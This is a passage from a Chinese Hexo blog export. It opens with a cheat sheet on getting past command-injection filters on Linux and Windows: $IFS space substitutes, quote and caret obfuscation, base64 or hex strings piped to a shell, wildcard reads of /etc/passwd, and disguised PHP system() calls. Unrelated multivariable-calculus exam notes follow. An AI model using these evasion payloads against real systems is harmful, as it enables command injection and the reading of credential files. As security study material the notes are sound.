<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PATH:5:1&#125;	//l</span><br><span class="line">$&#123;PATH:2:1&#125;	//s</span><br><span class="line">$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;	//拼接后是ls,执行命令</span><br><span class="line">$&#123;PATH:5:1&#125;s			//拼接后是ls,执行命令</span><br></pre></td></tr></table></figure>



<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$IFS$1</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&lt;     比如cat&lt;a.tct:表示cat a.txt</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>



<h3 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h3><p>基础常见版本:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wh\o\ami	//反斜线绕过</span><br><span class="line">who&quot;a&quot;mi	//双引号绕过</span><br><span class="line">whoa&#x27;m&#x27;i	//单引号绕过</span><br><span class="line">whoam``i	//反引号绕过</span><br><span class="line">echo d2hvYW1p|base64 -d|sh	//base64绕过,其中d2hvYW1p是whoami的base64编码</span><br><span class="line">echo d2hvYW1p|base64 -d|bash//base64绕过,其中d2hvYW1p是whoami的base64编码</span><br><span class="line">`echo d2hvYW1p|base64 -d` //将其base64解码,然后用反引号来执行命令</span><br><span class="line">echo 77686F616D69 | xxd -r -p | bash //hex绕过,其中77686F616D69是whoami的hex编码</span><br><span class="line"></span><br><span class="line">//$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10) :比如ca$&#123;21&#125;t a.txt表示cat a.txt    在没有传入参数的情况下,这些特殊字符默认为空,如下:</span><br><span class="line">wh$1oami</span><br><span class="line">who$@ami</span><br><span class="line">whoa$*mi</span><br></pre></td></tr></table></figure>

<p>进阶深入:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">666`whoami`666		//bash: 666root666: command not found</span><br><span class="line">666`\whoami`666		//bash: 666root666: command not found</span><br><span class="line">//命令执行后的结果在2个666中间</span><br></pre></td></tr></table></figure>

<p>所以更进一步:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w`f1hgb`ho`f1hgb`am`f1hgb`i		//反引号的作用是把括起来的字符当做命令执行</span><br><span class="line">w`\f1hgb`ho`\f1hgb`am`\f1hgb`i	//这个反斜线作用就是平时的那种连接,反引号的作用是把括起来的字符当做命令执行</span><br><span class="line">wh$(f1hgb)oa$(f1hgb)mi			//和上面的差不多,都说执行和拼接</span><br></pre></td></tr></table></figure>

<p>既可以绕过命令,又可以绕过文件名的,下述的则是只能用来绕过文件名的:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat fl[abc]g.php								 //匹配[abc]中的任何一个</span><br><span class="line">cat f[a-z]ag.txt								 //匹配a-z范围的任何字符</span><br><span class="line">cat fla*										 //用*匹配任意</span><br><span class="line">a=f;d=ag;c=l;cat $a$c$d.php 表示cat flag.php		//内联执行</span><br></pre></td></tr></table></figure>

<p>下述的则是文件名绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用正则:比如要读取etc/passwd</span><br><span class="line">cat /???/??????</span><br><span class="line">cat /???/pass*</span><br><span class="line">cat /etc$u/passwd</span><br></pre></td></tr></table></figure>



<h3 id="命令执行函数绕过"><a href="#命令执行函数绕过" class="headerlink" title="命令执行函数绕过"></a>命令执行函数绕过</h3><p>这里只举例<code>system</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&quot;cat /etc/passwd&quot;)</span><br><span class="line">&lt;=&gt;</span><br><span class="line">&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;cat /etc/passwd&quot;);</span><br><span class="line">&lt;=&gt;</span><br><span class="line">(sy.(st).em)(&quot;cat /etc/passwd&quot;);</span><br><span class="line">&lt;=&gt;还可以用注释方法绕过</span><br><span class="line">&quot;system/*fthgb666*/(&quot;cat /etc/passwd);&quot;</span><br><span class="line">&lt;=&gt;</span><br><span class="line">&quot;system/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);&quot;</span><br><span class="line">&lt;=&gt;</span><br><span class="line">&quot;(sy./*fthgb666*/(st)/*fthgb666*/.em)/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);&quot;</span><br></pre></td></tr></table></figure>



<h1 id="windows篇"><a href="#windows篇" class="headerlink" title="windows篇"></a>windows篇</h1><h3 id="符号与命令"><a href="#符号与命令" class="headerlink" title="符号与命令"></a>符号与命令</h3><ul>
<li><p><code>whoami</code> //正常执行</p>
</li>
<li><p><code>w&quot;h&quot;o&quot;a&quot;m&quot;i</code> 或<code>&quot;w&quot;h&quot;o&quot;a&quot;m&quot;i&quot;</code>或<code>&quot;w&quot;h&quot;o&quot;a&quot;m&quot;i</code>或<code>w&quot;h&quot;o&quot;a&quot;m&quot;i&quot;</code>//正常执行</p>
</li>
<li><p><code>who^ami</code>或<code>wh&quot;&quot;o^a^mi</code> 或<code>wh&quot;&quot;o^a^mi&quot;</code>//正常执行</p>
</li>
<li><ul>
<li>但是<code>&quot;wh&quot;&quot;o^a^mi&quot;</code>这种在开头就有单引号的情况是不能执行的</li>
</ul>
</li>
<li><p><code>(Whoami)</code>或<code>(Wh^o^am&quot;&quot;i)</code>或<code>((((Wh^o^am&quot;&quot;i))))</code> //正常执行</p>
<p>注:可以加无数个<code>&quot;</code>但不能同时连续加2个<code>^</code>符号，因为^号是cmd中的转义符，跟在他后面的符号会被转义</p>
</li>
</ul>
<h3 id="set命令"><a href="#set命令" class="headerlink" title="set命令"></a>set命令</h3><p>知识点:用两个%括起来的变量,会输出变量的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set a=1 //设置变量a，值为1</span><br><span class="line">echo a //此时输出结果为&quot;a&quot;</span><br><span class="line">echo %a% //此时输出结果为&quot;1&quot;</span><br></pre></td></tr></table></figure>

<p>接下来的进阶利用就是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set a=who</span><br><span class="line">set b=ami</span><br><span class="line">%a%%b% //正常执行whoami</span><br><span class="line">call %a%%b% //正常执行whoami</span><br></pre></td></tr></table></figure>

<p>所以,上述的符号与命令部分的所有操作,都可以通过<code>set</code>来实现,只需要慢慢拼接就ok</p>
<h3 id="切割字符"><a href="#切割字符" class="headerlink" title="切割字符"></a>切割字符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set a=whoami</span><br><span class="line">%a:~0% //取出所有字符,所以正常执行命令</span><br><span class="line">%a:~0,6% //从开始切割6个字符,刚好是whoami,所以正常执行</span><br><span class="line">%a:~0,5% //切割后是whoam,不是系统命令,不能执行</span><br></pre></td></tr></table></figure>



<p>注:上述可以使用减号,和python的切割效果差不多</p>
<p>所以,可以考虑的东西就来了:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set a=abc qwe //先自定义</span><br><span class="line">wh^o^%a:~0,1%mi //然后截断整理后就变成了:wh^o^ami,所以命令执行成功</span><br></pre></td></tr></table></figure>

<p>所以,这样写webshell什么的也就很简单了</p>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><ul>
<li><code>|</code>:可以连接命令,但只会执行后面的那条</li>
<li><code>||</code>:只有前面的命令失败,才会执行后面的语句</li>
<li><code>&amp;</code>:前面的命令可以成功也可以失败,都会执行后面的命令</li>
<li><code>&amp;&amp;</code>:必须两条命令都为真才可以全部执行。如果第一条语句错误,整个命令都不执行。如果第一条语句对,第二条错误,就只执行第一条</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami | ping www.baidu.com</span><br><span class="line">whoami || ping www.baidu.com</span><br><span class="line">qwe &amp; ping www.baidu.com</span><br><span class="line">qwe &amp;&amp; ping www.baidu.com</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
        <category>奇淫技巧</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>姿势学习</tag>
      </tags>
  </entry>
  <entry>
    <title>多元函数微分学定义篇</title>
    <url>/2021/08/03/%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E5%AE%9A%E4%B9%89%E7%AF%87/</url>
    <content><![CDATA[<h3 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h3><p><img src="https://ckcah.github.io/images/math/5/image-20210802094431031.png" alt="image-20210802094431031"></p>
<p><img src="https://ckcah.github.io/images/math/5/image-20210802094457045.png" alt="image-20210802094457045"></p>
<p><img src="https://ckcah.github.io/images/math/5/image-20210802094547842.png" alt="image-20210802094547842"></p>
<p><img src="https://ckcah.github.io/images/math/5/image-20210802094614235.png" alt="image-20210802094614235"></p>
<p><img src="https://ckcah.github.io/images/math/5/image-20210802094740416.png" alt="image-20210802094740416"></p>
<p><img src="https://ckcah.github.io/images/math/5/image-20210802094800383.png" alt="image-20210802094800383"></p>
<p><img src="https://ckcah.github.io/images/math/5/image-20210802094953782.png" alt="image-20210802094953782"></p>
<p><img src="https://ckcah.github.io/images/math/5/image-20210802095046503.png" alt="image-20210802095046503"></p>
<p><img src="https://ckcah.github.io/images/math/5/image-20210802095301416.png" alt="image-20210802095301416"></p>
<p><img src="https://ckcah.github.io/images/math/5/image-20210802095340547.png" alt="image-20210802095340547"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>数学</category>
        <category>定义篇</category>
        <category>高数</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>多元函数微分学解题思路篇</title>
    <url>/2021/08/03/%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%E7%AF%87/</url>
    <content><![CDATA[<h1 id="1-多元函数微分学"><a href="#1-多元函数微分学" class="headerlink" title="1.   多元函数微分学"></a>1.   多元函数微分学</h1><h2 id="1-1-重极限、连续、偏导数、全微分"><a href="#1-1-重极限、连续、偏导数、全微分" class="headerlink" title="1.1.   重极限、连续、偏导数、全微分"></a>1.1.   重极限、连续、偏导数、全微分</h2><h3 id="1-1-1-求极限"><a href="#1-1-1-求极限" class="headerlink" title="1.1.1.    求极限"></a>1.1.1.    求极限</h3><h4 id="1-1-1-1-p143-例1"><a href="#1-1-1-1-p143-例1" class="headerlink" title="1.1.1.1.    p143 例1"></a>1.1.1.1.    p143 例1</h4><h5 id="1-1-1-1-1-夹逼定理"><a href="#1-1-1-1-1-夹逼定理" class="headerlink" title="1.1.1.1.1.    夹逼定理"></a>1.1.1.1.1.    夹逼定理</h5><h5 id="1-1-1-1-2-整体绝对值函数-lt-绝对值分散到函数内部"><a href="#1-1-1-1-2-整体绝对值函数-lt-绝对值分散到函数内部" class="headerlink" title="1.1.1.1.2.    整体绝对值函数 &lt;= 绝对值分散到函数内部"></a>1.1.1.1.2.    整体绝对值函数 &lt;= 绝对值分散到函数内部</h5><h3 id="1-1-2-证明重极限不存在"><a href="#1-1-2-证明重极限不存在" class="headerlink" title="1.1.2.    证明重极限不存在"></a>1.1.2.    证明重极限不存在</h3><h4 id="1-1-2-1-p144-例2"><a href="#1-1-2-1-p144-例2" class="headerlink" title="1.1.2.1.    p144 例2"></a>1.1.2.1.    p144 例2</h4><h5 id="1-1-2-1-1-带入直线-如：-y-kx"><a href="#1-1-2-1-1-带入直线-如：-y-kx" class="headerlink" title="1.1.2.1.1.    带入直线 如： y = kx"></a>1.1.2.1.1.    带入直线 如： y = kx</h5><h5 id="1-1-2-1-2-只有沿两条不同路径-极限相同-才存在-否则极限不存在"><a href="#1-1-2-1-2-只有沿两条不同路径-极限相同-才存在-否则极限不存在" class="headerlink" title="1.1.2.1.2.    只有沿两条不同路径  极限相同 才存在 否则极限不存在"></a>1.1.2.1.2.    只有沿两条不同路径  极限相同 才存在 否则极限不存在</h5><h3 id="1-1-3-判断分段函数连续性"><a href="#1-1-3-判断分段函数连续性" class="headerlink" title="1.1.3.    判断分段函数连续性"></a>1.1.3.    判断分段函数连续性</h3><h4 id="1-1-3-1-分段函数在分段点的连续性"><a href="#1-1-3-1-分段函数在分段点的连续性" class="headerlink" title="1.1.3.1.    分段函数在分段点的连续性"></a>1.1.3.1.    分段函数在分段点的连续性</h4><h5 id="1-1-3-1-1-夹逼定理"><a href="#1-1-3-1-1-夹逼定理" class="headerlink" title="1.1.3.1.1.    夹逼定理"></a>1.1.3.1.1.    夹逼定理</h5><h3 id="1-1-4-讨论连续性、可导性、可微性-（考的最多的是可微性）"><a href="#1-1-4-讨论连续性、可导性、可微性-（考的最多的是可微性）" class="headerlink" title="1.1.4.    讨论连续性、可导性、可微性 （考的最多的是可微性）"></a>1.1.4.    讨论连续性、可导性、可微性 （考的最多的是可微性）</h3><h4 id="1-1-4-1-题型变幻可能点"><a href="#1-1-4-1-题型变幻可能点" class="headerlink" title="1.1.4.1.    题型变幻可能点"></a>1.1.4.1.    题型变幻可能点</h4><h5 id="1-1-4-1-1-简单分段函数判断"><a href="#1-1-4-1-1-简单分段函数判断" class="headerlink" title="1.1.4.1.1.    简单分段函数判断"></a>1.1.4.1.1.    简单分段函数判断</h5><h5 id="1-1-4-1-2-函数实例可微问充分条件"><a href="#1-1-4-1-2-函数实例可微问充分条件" class="headerlink" title="1.1.4.1.2.    函数实例可微问充分条件"></a>1.1.4.1.2.    函数实例可微问充分条件</h5><h5 id="1-1-4-1-3-函数在某点连续，选项中有带绝对值的，有平方的，判断三个特性"><a href="#1-1-4-1-3-函数在某点连续，选项中有带绝对值的，有平方的，判断三个特性" class="headerlink" title="1.1.4.1.3.    函数在某点连续，选项中有带绝对值的，有平方的，判断三个特性"></a>1.1.4.1.3.    函数在某点连续，选项中有带绝对值的，有平方的，判断三个特性</h5><h5 id="1-1-4-1-4-知可微，求-dz"><a href="#1-1-4-1-4-知可微，求-dz" class="headerlink" title="1.1.4.1.4.    知可微，求 dz"></a>1.1.4.1.4.    知可微，求 dz</h5><h5 id="1-1-4-1-5-函数带绝对值，在某点的邻域连续，先求x-y一阶偏导分别存在的条件，再求该点是否可微"><a href="#1-1-4-1-5-函数带绝对值，在某点的邻域连续，先求x-y一阶偏导分别存在的条件，再求该点是否可微" class="headerlink" title="1.1.4.1.5.    函数带绝对值，在某点的邻域连续，先求x,y一阶偏导分别存在的条件，再求该点是否可微"></a>1.1.4.1.5.    函数带绝对值，在某点的邻域连续，先求x,y一阶偏导分别存在的条件，再求该点是否可微</h5><h5 id="1-1-4-1-6-p150-例7-（最难的题）-综合考察"><a href="#1-1-4-1-6-p150-例7-（最难的题）-综合考察" class="headerlink" title="1.1.4.1.6.    p150 例7 （最难的题） 综合考察"></a>1.1.4.1.6.    p150 例7 （最难的题） 综合考察</h5><h6 id="1-1-4-1-6-1-￼"><a href="#1-1-4-1-6-1-￼" class="headerlink" title="1.1.4.1.6.1.    ￼ "></a>1.1.4.1.6.1.    ￼ <img src="https://ckcah.github.io/images/math/5.01/image_1627953354_4.png" alt="img"></h6><h6 id="1-1-4-1-6-2-￼-￼"><a href="#1-1-4-1-6-2-￼-￼" class="headerlink" title="1.1.4.1.6.2.    ￼ ￼ "></a>1.1.4.1.6.2.    ￼ ￼ <img src="https://ckcah.github.io/images/math/5.01/image_1627953677_7.png" alt="img"></h6><p>1.1.4.1.6.2.1. 做题步骤： 目的：可微公式构造等价 1.用拉格朗日中值定理找出题目中未给出的二元函数的y一导数形式（带有一个无穷小的θ * △y） 2.看到题目中给出的x的一阶偏导式子 3.根据1.  和2.  写出△z 4.从y的一阶偏导连续知道极限值等于函数值 5.将△z中关于y的式子替换为  不带θ * △y 的式子 6.根据绝对值的性质得出 （△z / p）趋近于 0  则（△z / p）= o(p) ，所以可微</p>
<p>1.1.4.1.6.2.2. 涉及知识点： 1.拉格朗日中值定理 2.可微公式 3.绝对值分散</p>
<p>1.1.4.1.6.2.3. 总结： 可微就一定满足可微的公式 而可微公式中有无穷小 所以问题变成如何证明可微公式的多余式子等于无穷小</p>
<h4 id="1-1-4-2-解题套路"><a href="#1-1-4-2-解题套路" class="headerlink" title="1.1.4.2.    解题套路"></a>1.1.4.2.    解题套路</h4><h5 id="1-1-4-2-1-￼"><a href="#1-1-4-2-1-￼" class="headerlink" title="1.1.4.2.1.    ￼  "></a>1.1.4.2.1.    ￼  <img src="https://ckcah.github.io/images/math/5.01/image_1627952623_3.png" alt="img"></h5><h5 id="1-1-4-2-2-￼"><a href="#1-1-4-2-2-￼" class="headerlink" title="1.1.4.2.2.    ￼  "></a>1.1.4.2.2.    ￼  <img src="https://ckcah.github.io/images/math/5.01/image_1627951844_1.png" alt="img"></h5><h5 id="1-1-4-2-3-用的最多"><a href="#1-1-4-2-3-用的最多" class="headerlink" title="1.1.4.2.3.    用的最多"></a>1.1.4.2.3.    用的最多</h5><h4 id="1-1-4-3-注意："><a href="#1-1-4-3-注意：" class="headerlink" title="1.1.4.3.    注意："></a>1.1.4.3.    注意：</h4><h5 id="1-1-4-3-1-￼"><a href="#1-1-4-3-1-￼" class="headerlink" title="1.1.4.3.1.    ￼  "></a>1.1.4.3.1.    ￼  <img src="https://ckcah.github.io/images/math/5.01/image_1627952197_2.png" alt="img"></h5><h4 id="1-1-4-4-自我总结"><a href="#1-1-4-4-自我总结" class="headerlink" title="1.1.4.4.    自我总结"></a>1.1.4.4.    自我总结</h4><h5 id="1-1-4-4-1-一般涉及到可微，都要用到这5个公式-特别是△z-f-x-y-f-x0-y0-A-x-x0-B-y-y0-o-p"><a href="#1-1-4-4-1-一般涉及到可微，都要用到这5个公式-特别是△z-f-x-y-f-x0-y0-A-x-x0-B-y-y0-o-p" class="headerlink" title="1.1.4.4.1.    一般涉及到可微，都要用到这5个公式 特别是△z = f(x,y) - f(x0,y0) = A(x - x0) + B(y - y0) + o(p)"></a>1.1.4.4.1.    一般涉及到可微，都要用到这5个公式 特别是△z = f(x,y) - f(x0,y0) = A(x - x0) + B(y - y0) + o(p)</h5><h2 id="1-2-偏导数与全微分的计算"><a href="#1-2-偏导数与全微分的计算" class="headerlink" title="1.2.    偏导数与全微分的计算"></a>1.2.    偏导数与全微分的计算</h2><h3 id="1-2-1-求一点处的偏导数与全微分"><a href="#1-2-1-求一点处的偏导数与全微分" class="headerlink" title="1.2.1.    求一点处的偏导数与全微分"></a>1.2.1.    求一点处的偏导数与全微分</h3><h4 id="1-2-1-1-题型变幻可能点"><a href="#1-2-1-1-题型变幻可能点" class="headerlink" title="1.2.1.1.    题型变幻可能点"></a>1.2.1.1.    题型变幻可能点</h4><h5 id="1-2-1-1-1-带绝对值的分段函数求极限"><a href="#1-2-1-1-1-带绝对值的分段函数求极限" class="headerlink" title="1.2.1.1.1.    带绝对值的分段函数求极限"></a>1.2.1.1.1.    带绝对值的分段函数求极限</h5><h5 id="1-2-1-1-2-求函数在某点的x、y一阶偏导数"><a href="#1-2-1-1-2-求函数在某点的x、y一阶偏导数" class="headerlink" title="1.2.1.1.2.    求函数在某点的x、y一阶偏导数"></a>1.2.1.1.2.    求函数在某点的x、y一阶偏导数</h5><h5 id="1-2-1-1-3-函数为幂指函数，带xyz"><a href="#1-2-1-1-3-函数为幂指函数，带xyz" class="headerlink" title="1.2.1.1.3.    函数为幂指函数，带xyz"></a>1.2.1.1.3.    函数为幂指函数，带xyz</h5><h4 id="1-2-1-2-解题套路"><a href="#1-2-1-2-解题套路" class="headerlink" title="1.2.1.2.    解题套路"></a>1.2.1.2.    解题套路</h4><h5 id="1-2-1-2-1-求分段函数在分界点处的偏导数一般都是用定义"><a href="#1-2-1-2-1-求分段函数在分界点处的偏导数一般都是用定义" class="headerlink" title="1.2.1.2.1.    求分段函数在分界点处的偏导数一般都是用定义"></a>1.2.1.2.1.    求分段函数在分界点处的偏导数一般都是用定义</h5><h5 id="1-2-1-2-2-求具体点处的偏导数可先代后求"><a href="#1-2-1-2-2-求具体点处的偏导数可先代后求" class="headerlink" title="1.2.1.2.2.    求具体点处的偏导数可先代后求"></a>1.2.1.2.2.    求具体点处的偏导数可先代后求</h5><h5 id="1-2-1-2-3-求具体点处的高阶偏导数采用先代后求"><a href="#1-2-1-2-3-求具体点处的高阶偏导数采用先代后求" class="headerlink" title="1.2.1.2.3.    求具体点处的高阶偏导数采用先代后求"></a>1.2.1.2.3.    求具体点处的高阶偏导数采用先代后求</h5><h3 id="1-2-2-求已给出具体表达式函数的偏导数与全微分"><a href="#1-2-2-求已给出具体表达式函数的偏导数与全微分" class="headerlink" title="1.2.2.    求已给出具体表达式函数的偏导数与全微分"></a>1.2.2.    求已给出具体表达式函数的偏导数与全微分</h3><h4 id="1-2-2-1-题型变幻可能点-及解题套路"><a href="#1-2-2-1-题型变幻可能点-及解题套路" class="headerlink" title="1.2.2.1.    题型变幻可能点 及解题套路"></a>1.2.2.1.    题型变幻可能点 及解题套路</h4><h5 id="1-2-2-1-1-二元带幂复合函数求偏导"><a href="#1-2-2-1-1-二元带幂复合函数求偏导" class="headerlink" title="1.2.2.1.1.    二元带幂复合函数求偏导"></a>1.2.2.1.1.    二元带幂复合函数求偏导</h5><h5 id="1-2-2-1-2-给出一部分一阶偏导，原函数的式子和值，求完整的原函数"><a href="#1-2-2-1-2-给出一部分一阶偏导，原函数的式子和值，求完整的原函数" class="headerlink" title="1.2.2.1.2.    给出一部分一阶偏导，原函数的式子和值，求完整的原函数"></a>1.2.2.1.2.    给出一部分一阶偏导，原函数的式子和值，求完整的原函数</h5><h6 id="1-2-2-1-2-1-若为选择题，则直接带入选项测试"><a href="#1-2-2-1-2-1-若为选择题，则直接带入选项测试" class="headerlink" title="1.2.2.1.2.1.    若为选择题，则直接带入选项测试"></a>1.2.2.1.2.1.    若为选择题，则直接带入选项测试</h6><h6 id="1-2-2-1-2-2-若为简答题，则采用不定积分法"><a href="#1-2-2-1-2-2-若为简答题，则采用不定积分法" class="headerlink" title="1.2.2.1.2.2.    若为简答题，则采用不定积分法"></a>1.2.2.1.2.2.    若为简答题，则采用不定积分法</h6><h5 id="1-2-2-1-3-已知全微分，求其中的不确定常数值"><a href="#1-2-2-1-3-已知全微分，求其中的不确定常数值" class="headerlink" title="1.2.2.1.3.    已知全微分，求其中的不确定常数值"></a>1.2.2.1.3.    已知全微分，求其中的不确定常数值</h5><h6 id="1-2-2-1-3-1-利用公式-如：-￼-￼"><a href="#1-2-2-1-3-1-利用公式-如：-￼-￼" class="headerlink" title="1.2.2.1.3.1.    利用公式 如： ￼ ￼ "></a>1.2.2.1.3.1.    利用公式 如： ￼ ￼ <img src="https://ckcah.github.io/images/math/5.01/image_1627955298_9.png" alt="img"></h6><p><img src="https://ckcah.github.io/images/math/5.01/image_1627955159_8.png" alt="img"></p>
<h6 id="1-2-2-1-3-2-凑微分-如：-￼"><a href="#1-2-2-1-3-2-凑微分-如：-￼" class="headerlink" title="1.2.2.1.3.2.    凑微分 如： ￼ "></a>1.2.2.1.3.2.    凑微分 如： ￼ <img src="https://ckcah.github.io/images/math/5.01/image_1627955386_10.png" alt="img"></h6><h3 id="1-2-3-含有抽象函数的复合函数偏导数与全微分"><a href="#1-2-3-含有抽象函数的复合函数偏导数与全微分" class="headerlink" title="1.2.3.    含有抽象函数的复合函数偏导数与全微分"></a>1.2.3.    含有抽象函数的复合函数偏导数与全微分</h3><h4 id="1-2-3-1-题型变幻可能点"><a href="#1-2-3-1-题型变幻可能点" class="headerlink" title="1.2.3.1.    题型变幻可能点"></a>1.2.3.1.    题型变幻可能点</h4><h5 id="1-2-3-1-1-一般形式就是复合函数，然后带有抽象函数"><a href="#1-2-3-1-1-一般形式就是复合函数，然后带有抽象函数" class="headerlink" title="1.2.3.1.1.    一般形式就是复合函数，然后带有抽象函数"></a>1.2.3.1.1.    一般形式就是复合函数，然后带有抽象函数</h5><h5 id="1-2-3-1-2-或带有不定积分函数"><a href="#1-2-3-1-2-或带有不定积分函数" class="headerlink" title="1.2.3.1.2.    或带有不定积分函数"></a>1.2.3.1.2.    或带有不定积分函数</h5><h5 id="1-2-3-1-3-极坐标（虚张声势型）"><a href="#1-2-3-1-3-极坐标（虚张声势型）" class="headerlink" title="1.2.3.1.3.    极坐标（虚张声势型）"></a>1.2.3.1.3.    极坐标（虚张声势型）</h5><h6 id="1-2-3-1-3-1-￼"><a href="#1-2-3-1-3-1-￼" class="headerlink" title="1.2.3.1.3.1.    ￼ "></a>1.2.3.1.3.1.    ￼ <img src="https://ckcah.github.io/images/math/5.01/image_1627956434_11.png" alt="img"></h6><h5 id="1-2-3-1-4-￼"><a href="#1-2-3-1-4-￼" class="headerlink" title="1.2.3.1.4.    ￼  "></a>1.2.3.1.4.    ￼  <img src="https://ckcah.github.io/images/math/5.01/image_1627956985_12.png" alt="img"></h5><h4 id="1-2-3-2-解题套路"><a href="#1-2-3-2-解题套路" class="headerlink" title="1.2.3.2.    解题套路"></a>1.2.3.2.    解题套路</h4><h5 id="1-2-3-2-1-直接求"><a href="#1-2-3-2-1-直接求" class="headerlink" title="1.2.3.2.1.    直接求"></a>1.2.3.2.1.    直接求</h5><h5 id="1-2-3-2-2-选择题：带入选项"><a href="#1-2-3-2-2-选择题：带入选项" class="headerlink" title="1.2.3.2.2.    选择题：带入选项"></a>1.2.3.2.2.    选择题：带入选项</h5><h3 id="1-2-4-隐函数的偏导数与全微分"><a href="#1-2-4-隐函数的偏导数与全微分" class="headerlink" title="1.2.4.    隐函数的偏导数与全微分"></a>1.2.4.    隐函数的偏导数与全微分</h3><h4 id="1-2-4-1-求解思路"><a href="#1-2-4-1-求解思路" class="headerlink" title="1.2.4.1.    求解思路"></a>1.2.4.1.    求解思路</h4><h5 id="1-2-4-1-1-直接求"><a href="#1-2-4-1-1-直接求" class="headerlink" title="1.2.4.1.1.    直接求"></a>1.2.4.1.1.    直接求</h5><h5 id="1-2-4-1-2-求微分"><a href="#1-2-4-1-2-求微分" class="headerlink" title="1.2.4.1.2.    求微分"></a>1.2.4.1.2.    求微分</h5><h5 id="1-2-4-1-3-￼"><a href="#1-2-4-1-3-￼" class="headerlink" title="1.2.4.1.3.    ￼  "></a>1.2.4.1.3.    ￼  <img src="https://ckcah.github.io/images/math/5.01/image_1627957311_13.png" alt="img"></h5><h6 id="1-2-4-1-3-1-￼"><a href="#1-2-4-1-3-1-￼" class="headerlink" title="1.2.4.1.3.1.    ￼ "></a>1.2.4.1.3.1.    ￼ <img src="https://ckcah.github.io/images/math/5.01/image_1627957350_14.png" alt="img"></h6><h3 id="1-2-5-总结-时时刻刻想到全微分公式"><a href="#1-2-5-总结-时时刻刻想到全微分公式" class="headerlink" title="1.2.5.    总结: 时时刻刻想到全微分公式"></a>1.2.5.    总结: 时时刻刻想到全微分公式</h3><h2 id="1-3-极值与最值"><a href="#1-3-极值与最值" class="headerlink" title="1.3.    极值与最值"></a>1.3.    极值与最值</h2><h3 id="1-3-1-求无条件极值"><a href="#1-3-1-求无条件极值" class="headerlink" title="1.3.1.    求无条件极值"></a>1.3.1.    求无条件极值</h3><h4 id="1-3-1-1-1-先求出驻点（一阶偏导为0组合组成的点）-2-然后求出ABC-3-判定"><a href="#1-3-1-1-1-先求出驻点（一阶偏导为0组合组成的点）-2-然后求出ABC-3-判定" class="headerlink" title="1.3.1.1.    1.先求出驻点（一阶偏导为0组合组成的点） 2.然后求出ABC 3.判定"></a>1.3.1.1.    1.先求出驻点（一阶偏导为0组合组成的点） 2.然后求出ABC 3.判定</h4><h4 id="1-3-1-2-1-构造满足条件的全微分公式-2-可看出无穷小p的样子-则得出驻点为（x0-y0）"><a href="#1-3-1-2-1-构造满足条件的全微分公式-2-可看出无穷小p的样子-则得出驻点为（x0-y0）" class="headerlink" title="1.3.1.2.    1.构造满足条件的全微分公式 2.可看出无穷小p的样子 则得出驻点为（x0,y0）"></a>1.3.1.2.    1.构造满足条件的全微分公式 2.可看出无穷小p的样子 则得出驻点为（x0,y0）</h4><h5 id="1-3-1-2-1-如：-则"><a href="#1-3-1-2-1-如：-则" class="headerlink" title="1.3.1.2.1.    如： 则"></a>1.3.1.2.1.    如：<img src="https://ckcah.github.io/images/math/5.01/image_1627957764_15.png" alt="img"> 则<img src="https://ckcah.github.io/images/math/5.01/image_1627957807_16.png" alt="img"></h5><h4 id="1-3-1-3-先代后求"><a href="#1-3-1-3-先代后求" 